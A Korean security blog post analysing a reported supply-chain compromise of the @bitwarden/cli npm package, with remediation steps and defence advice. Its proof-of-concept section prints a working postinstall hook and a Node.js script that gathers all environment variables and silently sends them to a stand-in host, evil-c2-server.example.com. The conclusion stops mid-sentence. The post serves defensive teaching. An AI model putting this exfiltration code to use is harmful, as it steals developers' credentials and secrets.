---
title: "Bitwarden CLI 공급망 공격: npm 패키지 탈취 분석"
date: 2026-04-29T01:07:11+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

평소와 다름없는 개발 일상의 한 장면을 상상해 보십시오. 당신은 보안을 강화하기 위해 회사 내부 자동화 스크립트에 비밀번호 관리 기능을 추가하려 합니다. 가장 신뢰할 수 있는 오픈소스 도구 중 하나인 Bitwarden의 CLI 버전을 선택했고, 터미널에 익숙한 명령어를 입력합니다.

`npm install @bitwarden/cli`

설치가 완료되고 명령어를 실행하는 순간, 당신의 터미널은 당신의 기밀 데이터를 담은 채 알 수 없는 외부 서버로 향하는 통로가 되어버립니다. 최근 Checkmarx가 추적 중인 공급망 공격 캠페인에서 정확히 이런 일이 벌어졌습니다. 수천 명의 개발자가 신뢰하던 `@bitwarden/cli` 패키지의 특정 버전이 탈취되었습니다. 이 사건은 "공식 레지스트리에 배포된 패키지는 안전하다"는 우리의 무의식적인 믿음이 얼마나 취약한지를 적나라하게 보여줍니다. 방어 관점에서 이 공격의 정확한 메커니즘을 이해하는 것은 더 이상 선택이 아닌 필수입니다.

## 본론

### 공급망 공격의 기술적 배경

이번 사건의 핵심은 **패키지 토면(Package Typosquatting)이나 계정 탈취를 넘어선, 정상 배포 프로세스 내부로의 침투**일 가능성이 큽니다. 공격자는 `@bitwarden/cli`의 `2026.4.0` 빌드에 악성 스크립트를 포함시키는 데 성공했습니다. Bitwarden CLI는 Node.js 환경에서 실행되므로, 주요 진입점인 `package.json`의 `postinstall` 스크립트나 라이브러리 로딩 시점에 악성 코드를 삽입하는 것이 일반적인 공격 벡터입니다.

공격자는 사용자가 이 패키지를 설치(`npm install`)할 때 즉시 실행되는 악성 스크립트(`bw1.js` 등)를 포함시켰습니다. 이 스크립트는 일반적인 기능을 수행하는 척하면서 백그라운드에서 시스템의 환경 변수, `.npmrc`, 또는 로컬에 저장된 자격 증명 등을 수집하여 C2(Command & Control) 서버로 전송하려 시도했을 것입니다.

다음은 이러한 공급망 공격이 일어나는 전형적인 흐름을 간소화한 다이어그램입니다.

```javascript
graph TD
    A[개발자] -->|의존성 추가 요청| B[npm Registry]
    B -->|악성 패키지 다운로드| C[개발자 로컬 환경]
    C -->|설치 완료 및 트리거| D[postinstall Hook]
    D -->|악성 스크립트 실행| E[bw1.js 등 페이로드]
    E -->|정보 수집| F[환경 변수 / 토큰 탈취]
    F -->|암호화 전송| G[공격자 C2 서버]
    E -->|기능 흉내 내기| H[정상적인 CLI 실행 착각]
```

### 악성 코드 실행 메커니즘 분석 (PoC)

**⚠️ 윤리적 경고**: 아래 코드는 공급망 공격의 메커니즘을 이해하고 방어하기 위한 **학습 및 교육 목적의 개념 증명(PoC) 코드**입니다. 악의적인 목적으로 사용하는 것은 엄격히 금지되며 법적 책임을 따릅니다.

일반적으로 npm 패키지 내의 악성 코드는 `package.json`의 스크립트 필드를 통해 실행됩니다. 공격자가 `postinstall` 스크립트를 어떻게 악용할 수 있는지 보여주는 시뮬레이션 코드입니다.

**악성 package.json 예시:**

```json
{
  "name": "@bitwarden/cli",
  "version": "2026.4.0",
  "scripts": {
    "postinstall": "node ./utils/bw1.js && echo 'Installation complete.'"
  }
}
```

**악성 JavaScript 스크립트 (bw1.js 시뮬레이션):**

```javascript
// filename: bw1.js
// 목적: 시스템 환경 변수 탈취 및 외부 전송 시뮬레이션

const https = require('https');
const os = require('os');

// 탈취할 대상 데이터 정의 (시스템 정보 및 환경 변수)
const sensitiveData = {
    hostname: os.hostname(),
    platform: os.platform(),
    env_vars: process.env // 실제 공격에서는 NODE_ENV, AWS_KEY 등을 필터링하여 전송
};

// C2 서버로 데이터 전송 함수
function exfiltrate(data) {
    const postData = JSON.stringify(data);

    const options = {
        hostname: 'evil-c2-server.example.com', // 실제 공격자의 도메인
        port: 443,
        path: '/api/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    // 사용자 눈에 띄지 않도록 에러를 무시하고 조용히 실행
    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            // 응답 처리
        });
    });

    req.on('error', (e) => {
        // 공격자는 에러를 숨김
    });

    req.write(postData);
    req.end();
}

// 실행
exfiltrate(sensitiveData);
```

이 코드가 개발자의 머신에서 실행되면, 설치 과정에서 에러 없이 성공한 것처럼 보이지만, 내부적으로는 민감한 정보가 유출됩니다. Bitwarden CLI 사례에서는 실제로 어떤 정보가 탈취되었는지 확인되지 않았으나, 이러한 유형의 공격은 주로 CI/CD 파이프라인 내의 API 키나 클라우드 자격 증명을 노리는 경우가 많습니다.

### 침해 탐지 및 대응 절차

이미 영향을 받은 버전(`2026.4.0`)을 사용했을 가능성이 있다면, 즉시 다음 단계별 가이드에 따라 조치해야 합니다. 단순히 `npm update`를 하는 것으로는 부족할 수 있습니다.

| 단계 | 조치 명칭 | 실행 명령어 및 설명 | | :--- | :--- | :--- | | 1 | **의존성 검사** | `npm ls @bitwarden/cli`<br>현재 설치된 버전이 2026.4.0인지 확인합니다. | | 2 | **악성 버전 삭제** | `npm uninstall @bitwarden/cli`<br>해당 패키지를 완전히 제거합니다. | | 3 | **캐시 정리** | `npm cache clean --force`<br>로컬 캐시에 남아있을 수 있는 악성 아티팩트를 제거합니다. | | 4 | **안전 버전 재설치** | `npm install @bitwarden/cli@latest`<br>공식 레포지토리에서 확인된 안전한 최신 버전을 설치합니다. | | 5 | **자격 증명 순환** | 해당 환경에서 사용된 API 키, 토큰, 비밀번호를 전부 변경합니다. |

### 심층 방어 전략

이번 사건을 계기로 프로젝트의 보안 태세를 재점검해야 합니다.

1.  **Lockfile 검토 (package-lock.json)**     단순히 `package.json`만 확인해서는 부족합니다. `package-lock.json`을 열어 실제로 설치된 패키지의 해시(Hash) 값이 공식 레지스트리의 해시와 일치하는지 확인해야 합니다. 공급망 공격은 릴리스 직후 특정 시점에만 발생하므로, 시점에 따른 해시 검증이 중요합니다.

2.  **Software Bill of Materials (SBOM) 도입**     프로젝트에 사용된 모든 오픈소스 소프트웨어의 목록을 작성하고 이를 지속적으로 모니터링해야 합니다. 새로운 취약점이 보고되었을 때 SBOM이 있다면 즉시 영향도 분석이 가능합니다.

3.  **정책 기반 설치 제한**     CI/CD 파이프라인에서는 최신 버전(`@latest`)을 사용하는 것을 지양하고, 정확한 버전 범위를 지정하거나, 패키지가 릴리스된 지 일정 시간(예: 72시간)이 지나지 않으면 설치를 차단하는 정책을 도입하는 것이 좋습니다.

## 결론

Bitwarden CLI 패키지 탈취 사건은 "보안 도구라고 해서 안전하지는 않다"는 냉혹한

---

**출처**: [https://news.hada.io/topic?id=28837](https://news.hada.io/topic?id=28837)